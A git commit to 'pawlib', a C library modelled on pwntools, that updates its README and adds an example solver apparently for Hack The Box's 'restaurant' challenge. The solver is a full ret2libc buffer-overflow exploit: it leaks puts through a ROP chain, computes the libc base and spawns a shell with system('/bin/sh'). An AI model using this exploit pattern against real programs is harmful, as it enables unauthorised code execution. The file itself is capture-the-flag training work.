c3c75f57a0a555231c72db9a272bf7280bb4c5e5
d3bo <arnaudeusedes@gmail.com>
2026-06-03 16:47:59 +0200

    example solver

--- README.md
+++ README.md
@@ -1,10 +1,14 @@
+# pawlib
+
 ```
-make
 sudo make install
 make clean
 make example
 ```
 
 A project inspired by pwntools but implemented in C, currently in the early stages of development.
+
+- Example using "ls": [example.c](template/example.c) (You can test it with make example)
+- Example solver for the restaurant challenge from hackthebox: [example_solver.c](templates/example_solver.c)
 
 ![](img/example_solver.png)
---
+++ template/example_solver.c
@@ -0,0 +1,70 @@
+#include <pawlib.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <inttypes.h>
+int main() {
+
+  t_process p = paw_open_process("./restaurant_patched");
+  p.log_level = 0;
+
+  int rip_offset = 40;
+  uintptr_t ret = 0x40063e;
+  uintptr_t pop_rdi_ret = 0x4010a3;
+
+  uintptr_t puts_got = 0x601fa8;
+  uintptr_t puts_plt = 0x400650;
+
+  uintptr_t puts_libc = 0x000000000080aa0;
+  uintptr_t system_libc = 0x00000000004f550;
+  uintptr_t binsh_libc = 0x01b3e1a;
+
+  uintptr_t main = 0x0000000000400f68;
+
+  t_data payload = paw_init_data();
+
+  paw_add(&payload, "1", 1);
+
+  paw_recvuntil(p, ">", 1);
+  paw_sendline(p, payload);
+
+  t_data payload2 = paw_init_data();
+
+  paw_add_repeat(&payload2, "A", 1 , rip_offset);
+  paw_add_p64(&payload2, pop_rdi_ret);
+  paw_add_p64(&payload2, puts_got);
+  paw_add_p64(&payload2, puts_plt);
+  paw_add_p64(&payload2, main);
+
+  paw_send(p, payload2);
+
+  paw_recvuntil(p, "Enjoy your ", 11);
+
+  paw_recv(p, rip_offset);
+
+  paw_recv(p, 3);
+  t_data leak = paw_recv(p, 6);
+
+
+  uintptr_t libc = paw_u64(leak);
+
+  libc -= puts_libc;
+
+  t_data payload3 = paw_init_data();
+
+  paw_add_repeat(&payload3, "A", 1 , rip_offset);
+  paw_add_p64(&payload3, ret);
+  paw_add_p64(&payload3, pop_rdi_ret);
+  paw_add_p64(&payload3, binsh_libc + libc);
+  paw_add_p64(&payload3, system_libc + libc);
+
+  paw_recvuntil(p, ">", 1);
+  paw_sendline(p, payload);
+  paw_recvuntil(p, ">", 1);
+  paw_sendline(p, payload3);
+
+  t_data payload4 = paw_init_data();
+  paw_add(&payload4, "whoami", 6);
+  paw_recv(p, 200);
+  paw_sendline(p, payload4);
+  paw_recv(p, 200);
+}
